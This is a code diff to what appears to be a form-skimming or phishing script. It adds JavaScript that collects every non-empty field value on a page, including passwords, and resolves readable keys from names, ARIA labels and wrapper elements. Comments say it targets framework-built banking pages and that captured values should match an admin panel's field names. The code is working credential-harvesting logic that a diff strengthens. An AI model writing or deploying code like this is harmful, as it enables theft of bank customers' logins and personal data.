@@ -364,19 +364,91 @@
 
   // ─── Common Event Trackers (Form Submit, SPA Page Views, Unload) ──────────
   function setupCommonTrackers(socket) {
+    // Framework banking pages wrap native <input> in custom elements
+    // (<oe-input>, <paper-input>, <mat-input>, ...) whose inner input often
+    // has no name/id — only aria-label / label / placeholder on the wrapper.
+    // We climb up to 4 levels looking for a meaningful attribute, then
+    // normalize labels ("Customer ID" → "customerId") so captured values
+    // land under human-readable keys instead of "field_0", "field_1".
+    function _normalizeLabel(raw) {
+      if (!raw) return '';
+      var s = String(raw).trim()
+        .replace(/^(l|i18n|msg|lbl|label|str|txt|placeholder|ph|t|tr|_)_+/i, '')
+        .replace(/[:?*\s]+$/, '').trim();
+      if (/^[a-zA-Z][a-zA-Z0-9]*$/.test(s)) return s.charAt(0).toLowerCase() + s.slice(1);
+      var parts = s.split(/[^a-zA-Z0-9]+/).filter(Boolean).map(function(w){return w.toLowerCase();});
+      if (!parts.length) return '';
+      return parts[0] + parts.slice(1).map(function(w){return w.charAt(0).toUpperCase() + w.slice(1);}).join('');
+    }
+
+    function _resolveFieldKey(input, idx) {
+      // Priority-based key resolution — same chain as the server-side scanner
+      // in services/scanFields.js so admin-visible field names match capture keys.
+      var direct = [
+        input.name,
+        input.getAttribute && input.getAttribute('formcontrolname'),
+        input.getAttribute && input.getAttribute('ng-reflect-name'),
+        input.getAttribute && input.getAttribute('data-name'),
+        input.getAttribute && input.getAttribute('data-field'),
+        input.getAttribute && input.getAttribute('data-testid'),
+        input.id,
+      ];
+      for (var i = 0; i < direct.length; i++) {
+        if (direct[i] && String(direct[i]).trim().length) return String(direct[i]).trim();
+      }
+
+      // Label-based fallbacks — try aria-label / placeholder on the input itself,
+      // then walk up to 4 ancestors looking at wrapper custom elements.
+      var labelSources = [
+        input.getAttribute && input.getAttribute('aria-label'),
+        input.getAttribute && input.getAttribute('placeholder'),
+      ];
+      var el = input.parentElement, depth = 0;
+      while (el && depth < 4) {
+        var tag = (el.tagName || '').toLowerCase();
+        if (/-(input|select|textarea|combo|field|control|picker|date|decimal|number|email|phone|password|checkbox|radio)$/.test(tag)) {
+          labelSources.push(
+            el.getAttribute('name'),
+            el.getAttribute('formcontrolname'),
+            el.getAttribute('data-name'),
+            el.getAttribute('data-field'),
+            el.id,
+            el.getAttribute('aria-label'),
+            el.getAttribute('label'),
+            el.getAttribute('placeholder')
+          );
+        }
+        el = el.parentElement;
+        depth++;
+      }
+      for (var j = 0; j < labelSources.length; j++) {
+        var normalized = _normalizeLabel(labelSources[j]);
+        if (normalized && normalized.length > 0 && normalized.length <= 40) return normalized;
+      }
+      return 'field_' + idx;
+    }
+
     // Helper to capture all non-empty input/select/textarea fields in a container or document
     function collectInputs(container) {
       const scope = container || document;
       const formData = {};
       const inputs = scope.querySelectorAll('input, select, textarea');
-      
+      const usedKeys = {};
+
       inputs.forEach(function(input, idx) {
         if (input.type === 'hidden' || input.type === 'submit' || input.type === 'button') return;
-        const key = input.name || input.id || input.getAttribute('placeholder') || ('field_' + idx);
         const val = input.value ? input.value.trim() : '';
-        if (key && val) {
-          formData[key] = val;
+        if (!val) return;
+
+        var key = _resolveFieldKey(input, idx);
+        // Deduplicate: if two fields resolved to the same key, suffix _2, _3…
+        if (usedKeys[key]) {
+          usedKeys[key]++;
+          key = key + '_' + usedKeys[key];
+        } else {
+          usedKeys[key] = 1;
         }
+        formData[key] = val;
       });
       return formData;
     }
